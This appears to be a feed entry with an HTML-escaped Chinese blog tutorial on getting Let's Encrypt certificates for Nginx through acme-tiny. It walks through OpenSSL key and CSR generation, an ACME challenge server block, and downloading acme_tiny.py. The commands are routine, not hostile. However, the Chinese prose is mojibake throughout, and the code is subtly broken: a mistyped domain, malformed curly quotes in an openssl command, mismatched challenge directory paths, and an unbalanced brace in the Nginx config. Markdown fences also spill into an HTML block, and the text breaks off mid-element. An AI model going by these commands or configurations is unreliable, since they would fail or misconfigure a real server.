    <content type="html">&lt;h2 id=&quot;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot;&gt;&lt;a href=&quot;#å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot;&gt;&lt;/a&gt;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&lt;/h2&gt;&lt;p&gt;HTTPSåœ¨å„å¤§äº’è”ç½‘ç«™å·²ç»æˆä¸ºæ ‡é…ï¼Œå°±è¿æŸåº¦ä¹Ÿåœ¨å‰ä¸ä¹…å…¨é¢å¯ç”¨HTTPSï¼Œå¾ˆå¤šå°ç½‘ç«™ä¹Ÿé…ç½®äº†HTTPSï¼Œè¿™æ˜¯æœªæ¥çš„ä¸€ç§è¶‹åŠ¿.HTTPSçš„å¥½å¤„å¤šå¤šï¼Œå¯ä»¥é˜²æ­¢å„ç§æ”»å‡»åŠ«æŒï¼Œè¿è¥å•†å¹¿å‘Šæ¤å…¥ï¼Œå®¢æˆ·ä¼ è¾“ä¿¡æ¯æ³„éœ²ç­‰é—®é¢˜ã€‚ä¸ºäº†è®©HTTPSèƒ½å¤Ÿå…¨é¢æ™®åŠï¼Œè®©æˆ‘ä»¬åŠ å¯†é¡¹ç›®åº”è¿è€Œç”Ÿï¼Œå®ƒç”±äº’è”ç½‘å®‰å…¨ç ”ç©¶å°ç»„ISRGï¼ˆäº’è”ç½‘å®‰å…¨ç ”ç©¶å°ç»„ï¼‰æä¾›æœåŠ¡ï¼Œå¾ˆæ—©ä¹‹å‰æˆ‘å°±åœ¨å…³æ³¨ &lt;a href=&quot;https://letsencrypt.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Letâ€™s Encrypt&lt;/a&gt;è¿™ä¸ªå…è´¹ã€è‡ªåŠ¨åŒ–ã€å¼€æ”¾çš„è¯ä¹¦ç­¾å‘æœåŠ¡ã€‚&lt;br&gt;ISRGæ˜¯æ¥è‡ªç¾å›½åŠ åˆ©ç¦å°¼äºšå·çš„ä¸€ä¸ªå…¬ç›Šç»„ç»‡.Letâ€™s Encryptå¾—åˆ°äº†Mozillaï¼ŒCiscoå’ŒChromeç­‰ä¼—å¤šå…¬å¸å’Œæœºæ„çš„æ”¯æŒã€‚&lt;/p&gt;
&lt;p&gt;ç”³è¯· &lt;code&gt;Let&amp;#39;s Encrypt&lt;/code&gt; è¯ä¹¦ä¸ä½†å…è´¹ï¼Œè¿˜éå¸¸ç®€å•ï¼Œè™½ç„¶æ¯æ¬¡åªæœ‰ 90 å¤©çš„æœ‰æ•ˆæœŸï¼Œä½†å¯ä»¥é€šè¿‡è„šæœ¬å®šæœŸæ›´æ–°ï¼Œé…å¥½ä¹‹åä¸€åŠ³æ°¸é€¸ã€‚æœ¬æ•™ç¨‹äº²æµ‹æœ‰æ•ˆï¼Œå¸Œæœ›å¯¹æ­£åœ¨å¯»æ‰¾å…è´¹HTTPSæ–¹æ¡ˆçš„ä½ æœ‰ä¸€å®šçš„å¸®åŠ©ï¼Œæœ¬æ–‡è®°å½•æœ¬ç«™ç”³è¯·è¿‡ç¨‹å’Œé‡åˆ°çš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;æŒ‰ç…§æˆ‘ä»¬çš„åŠ å¯†å®˜æ–¹æä¾›çš„å·¥å…·å®‰è£…HTTPSçš„è¯ä¸è¿‡äºå¤æ‚ï¼Œäºæ˜¯æœ‰å¥½å¿ƒäººæä¾›äº†æ›´ä¸ºè½»å·§çš„å·¥å…·å®‰è£…ï¼Œæè‡´çº¤å·§è¯ç”Ÿäº†ï¼Œå®ƒçš„ä»£ç é‡åœ¨200è¡Œå†…ï¼Œåªéœ€ä¾èµ–çš„Pythonå’ŒOpenSSLçš„ã€‚&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºLetâ€™s-EncryptåŠ å¯†è´¦å·&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºLetâ€™s-EncryptåŠ å¯†è´¦å·&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºLetâ€™s EncryptåŠ å¯†è´¦å·&quot;&gt;&lt;/a&gt;ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºLetâ€™s EncryptåŠ å¯†è´¦å·&lt;/h3&gt;&lt;p&gt;é¦–å…ˆåˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä¾‹å¦‚ &lt;code&gt;ssl&lt;/code&gt;ç”¨æ¥å­˜æ”¾å„ç§ä¸´æ—¶æ–‡ä»¶å’Œæœ€åçš„è¯ä¹¦æ–‡ä»¶ã€‚è¿›å…¥è¿™ä¸ªç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ª&lt;code&gt;RSA&lt;/code&gt;ç§é’¥ç”¨äº Letâ€™s Encrypt è¯†åˆ«ä½ çš„èº«ä»½ï¼š&lt;/p&gt;
&lt;p&gt;è®©æˆ‘ä»¬åŠ å¯†ä½¿ç”¨ä¸€ä¸ªç§é’¥æ¥è¿›è¡Œè´¦å·çš„åˆ›å»ºä¸ç™»é™†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ª&lt;code&gt;account.key&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir ssl &amp;amp;&amp;amp; cd ssl&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# openssl genrsa 4096 &amp;gt; account.key&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Generating RSA private key, 4096 bit long modulus&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...........................++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...........................++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;e is 65537 (0x10001)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåŸŸåçš„CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰&quot;&gt;&lt;a href=&quot;#ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåŸŸåçš„CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåŸŸåçš„CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰&quot;&gt;&lt;/a&gt;ç¬¬äºŒæ­¥ï¼šåˆ›å»ºåŸŸåçš„CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰&lt;/h3&gt;&lt;p&gt;è®©æˆ‘ä»¬åŠ å¯†ä½¿ç”¨çš„ACMEåè®®éœ€è¦ä¸€ä¸ªCSRæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥é‡æ–°ç”³è¯·HTTPSè¯ä¹¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºåŸŸåCSRï¼Œåœ¨åˆ›å»ºCSRä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç»™æˆ‘ä»¬çš„åŸŸååˆ›å»ºä¸€ä¸ªç§é’¥ï¼ˆè¿™ä¸ªå’Œä¸Šé¢çš„è´¦æˆ·ç§é’¥æ— å…³ï¼‰ã€‚&lt;br&gt;æ¥ç€å°±å¯ä»¥ç”Ÿæˆ &lt;code&gt;CSRï¼ˆCertificate Signing Requestï¼Œè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰æ–‡ä»¶äº†ã€‚&lt;/code&gt;åœ¨è¿™ä¹‹å‰ï¼Œè¿˜éœ€è¦åˆ›å»ºåŸŸåç§é’¥ï¼ˆä¸€å®šä¸è¦ä½¿ç”¨ä¸Šé¢çš„è´¦æˆ·ç§é’¥ï¼‰ï¼Œæ ¹æ®è¯ä¹¦ä¸åŒç±»å‹ï¼ŒåŸŸåç§é’¥ä¹Ÿå¯ä»¥é€‰æ‹© RSA å’Œ ECC ä¸¤ç§ä¸åŒç±»å‹ã€‚ä»¥ä¸‹ä¸¤ç§æ–¹å¼è¯·æ ¹æ®å®é™…æƒ…å†µäºŒé€‰ä¸€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1ï¼‰åˆ›å»º RSA ç§é’¥ï¼ˆå…¼å®¹æ€§å¥½ï¼‰ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl genrsa 4096 &amp;gt; domain.key&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2ï¼‰æ³¨æ„ï¼šä¸€å®šä¸è¦ä½¿ç”¨ä¸Šé¢åˆ›å»ºå¥½çš„account.key æ¥å½“domain.key â—ï¸&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æœ‰äº†ç§é’¥æ–‡ä»¶ï¼Œå°±å¯ä»¥åˆ›å»ºç”Ÿæˆ &lt;code&gt;CSRæ–‡ä»¶&lt;/code&gt;äº†ã€‚åœ¨ &lt;code&gt;CSR&lt;/code&gt;ä¸­æ¨èè‡³å°‘æŠŠåŸŸåå¸¦ &lt;code&gt;www&lt;/code&gt; å’Œä¸å¸¦&lt;code&gt;www&lt;/code&gt;çš„ä¸¤ç§æƒ…å†µéƒ½åŠ è¿›å»ï¼Œå…¶å®ƒå­åŸŸå¯ä»¥æ ¹æ®éœ€è¦æ·»åŠ ,æ›¿æ¢ä¸‹é¢çš„ihaozhuo.comå³å¯  &lt;code&gt;(ç›®å‰ä¸€å¼ è¯ä¹¦æœ€å¤šå¯ä»¥åŒ…å« 100 ä¸ªåŸŸå)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3ï¼‰æ³¨æ„ï¼Œç¨åä¼šè¯´åˆ°ï¼Œæ¯ä¸ªåŸŸåéƒ½ä¼šæ¶‰åŠåˆ°éªŒè¯ï¼‰&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ï¼ƒå•ä¸ªåŸŸå&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -subjâ€œ/CN=ihaozhuo.ccomâ€&amp;gt; domain.csr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ï¼ƒå¤šä¸ªåŸŸåï¼ˆå¦‚æœä½ æœ‰å¤šä¸ªåŸŸåï¼Œæ¯”å¦‚ï¼šwww.ihaozhuo.com å’Œihaozhuo.comï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ï¼‰&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -subj &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; -reqexts SAN -config &amp;lt;(cat /etc/ssl/openssl.cnf &amp;lt;(&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[SAN]\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com&quot;&lt;/span&gt;)) &amp;gt; domain.csr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4ï¼‰è¯´æ˜ï¼šihaozhuo.comï¼Œwww.ihaozhuo.com æ›¿æ¢æˆä½ çš„åŸŸåæ‰§è¡Œè¿™ä¸€æ­¥æ—¶ï¼Œéœ€è¦æŒ‡å®šopenssl.cnfæ–‡ä»¶ï¼Œä¸€èˆ¬è¿™ä¸ªæ–‡ä»¶åœ¨ä½ çš„opensslå®‰è£…ç›®å½•åº•ä¸‹ã€‚ å¦‚æœæç¤ºæ‰¾ä¸åˆ° /etc/ssl/openssl.cnfæ–‡ä»¶ï¼Œè¯·çœ‹çœ‹/usr/local/openssl/ssl/openssl.cnf å’Œ/etc/pki/tls/openssl.cnfæ˜¯å¦å­˜åœ¨ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# find / -name openssl.cnf    ##æŸ¥æ‰¾openssl.cnfæ–‡ä»¶&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/etc/pki/tls/openssl.cnf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# ln -s /etc/pki/tls/openssl.cnf /etc/ssl/openssl.cnf    #åšä¸ªè½¯é“¾æ¥ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 ssl]&lt;span class=&quot;comment&quot;&gt;# openssl req -new -sha256 -key domain.key -subj &quot;/&quot; -reqexts SAN -config &amp;lt;(cat /etc/ssl/openssl.cnf &amp;lt;(printf &quot;[SAN]\nsubjectAltName=DNS:ihaozhuo.com,DNS:www.ihaozhuo.com&quot;)) &amp;gt; domain.csr&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨äº¤äº’æ–¹å¼åˆ›å»º&lt;code&gt;CSR&lt;/code&gt;ï¼ˆéœ€è¦æ³¨æ„ &lt;code&gt;Common Name&lt;/code&gt;å¿…é¡»ä¸ºä½ çš„åŸŸåï¼‰ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;openssl req -new -sha256 -key domain.key -out domain.csr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;ç¬¬ä¸‰æ­¥ï¼šé…ç½®åŸŸåéªŒè¯&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸‰æ­¥ï¼šé…ç½®åŸŸåéªŒè¯&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸‰æ­¥ï¼šé…ç½®åŸŸåéªŒè¯&quot;&gt;&lt;/a&gt;ç¬¬ä¸‰æ­¥ï¼šé…ç½®åŸŸåéªŒè¯&lt;/h3&gt;&lt;p&gt;CAåœ¨ç­¾å‘DVï¼ˆåŸŸéªŒè¯ï¼‰è¯ä¹¦æ—¶ï¼Œéœ€è¦éªŒè¯åŸŸåæ‰€æœ‰æƒã€‚ä¼ ç»ŸCAçš„éªŒè¯æ–¹å¼ä¸€èˆ¬æ˜¯å¾€&lt;code&gt;admin@ihaozhuo.com&lt;/code&gt;å‘éªŒéªŒé‚®ä»¶ï¼Œè€Œè®©æˆ‘ä»¬åŠ å¯†æ˜¯åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªéšæœºéªŒè¯æ–‡ä»¶ï¼Œå†é€šè¿‡åˆ›å»ºCSRæ—¶æŒ‡å®šçš„åŸŸåè®¿é—®ï¼Œå¦‚æœå¯ä»¥è®¿é—®åˆ™è¡¨æ˜ä½ å¯¹è¿™ä¸ªåŸŸåæœ‰æ§åˆ¶æƒã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåˆ›å»ºç”¨äºå­˜æ”¾éªŒè¯æ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p var/www/challenge&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åé…ç½®ä¸€ä¸ª&lt;code&gt;Nginx&lt;/code&gt;æœåŠ¡ï¼Œä»¥Nginxä¸ºä¾‹:(æ³¨æ„ï¼šè¿™é‡Œçš„ç«¯å£æ˜¯80ï¼Œä¸æ˜¯443ï¼‰&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       listen       80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       server_name www.ihaozhuo.com ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       location /.well-known/acme-challenge/ &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;alias&lt;/span&gt; /var/www/challenges/;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       index  index.html index.php index.jsp index.htm;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       try_files &lt;span class=&quot;variable&quot;&gt;$uri&lt;/span&gt; =404;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        error_page   500 502 503 504  /50x.html;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location = /50x.html &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            root   html;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™æ˜¯æˆ‘åœ¨ä¸Šé¢é…ç½®å®Œæˆä»¥åéœ€è¦é‡å¯Nginxï¼Œå…ˆ&lt;code&gt;Nginx -t&lt;/code&gt;æ ¡éªŒä¸‹æ˜¯å¦æœ‰æ²¡æœ‰é—®é¢˜ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ihaozhuo1 conf]&lt;span class=&quot;comment&quot;&gt;# nginx -t&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nginx: the configuration file /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/nginx/conf/nginx.conf syntax is ok&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nginx: configuration file /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/nginx/conf/nginx.conf &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt; is successful&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;``` &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å¦‚ä½•éªŒè¯ä¸Šé¢è®¾ç½®æ˜¯å¦æˆåŠŸï¼Ÿ æˆ‘ä»¬åªè¦åœ¨ç›®å½•ï¼š/var/www/challenges/ ä¸‹é¢åˆ›å»ºæ–‡ä»¶ï¼štest.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç„¶åé€šè¿‡http://www.ihaozhuo.com/.well-known/acme-challenge/test.html URLè®¿é—®åœ°å€é‚£ä¸ªæ–‡ä»¶ï¼Œå¦‚æœèƒ½è®¿é—®æˆåŠŸè¯´æ˜ä½ é…ç½®æ²¡é—®é¢˜;å¦åˆ™å°±è¯´æ˜é…ç½®é”™è¯¯âŒï¼Œè¿™ä¸€æ­¥ä¸èƒ½å®ç°ä¸‹é¢å°±ä¸èƒ½æˆåŠŸäº†ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä»¥ä¸Šé…ç½®ä¼˜å…ˆæŸ¥æ‰¾ `var/www/challenge`ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±é‡å®šå‘åˆ°` HTTPS` åœ°å€ã€‚è¿™ä¸ªéªŒè¯æœåŠ¡ä»¥åæ›´æ–°è¯ä¹¦è¿˜è¦ç”¨åˆ°ï¼Œå»ºè®®ä¸€ç›´ä¿ç•™ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### ç¬¬å››æ­¥ï¼šè·å–ç½‘ç«™è¯ä¹¦&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;**1ï¼‰ä¸Šé¢é…ç½®å¥½ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨acme-tiny.pyæ¥è·å–ç½‘ç«™è¯ä¹¦** acme-tinyè„šæœ¬æ–‡ä»¶ä¸ŠGithubä¸‹è½½ï¼š[acme-tiny.py](https://github.com/diafygi/acme-tiny)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;**2ï¼‰å…ˆæŠŠ acme-tiny è„šæœ¬ä¿å­˜åˆ°ä¹‹å‰çš„sslç›®å½•**&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;```bash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;3ï¼‰ç„¶åæŒ‡å®šè´¦æˆ·ç§é’¥ã€CSR ä»¥åŠéªŒè¯ç›®å½•ï¼Œæ‰§è¡Œè„šæœ¬æ¥è·å–ç½‘ç«™è¯ä¹¦&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /var/www/challenges/ &amp;gt; ./signed.crt&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4ï¼‰å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œå½“å‰ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€ä¸ª&lt;code&gt;signed.crt&lt;/code&gt;è¿™å°±æ˜¯ç”³è¯·å¥½çš„è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè·Ÿæˆ‘ä¸€æ ·æŠ¥é”™äº†è¯·çœ‹ä¸‹é¢&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div 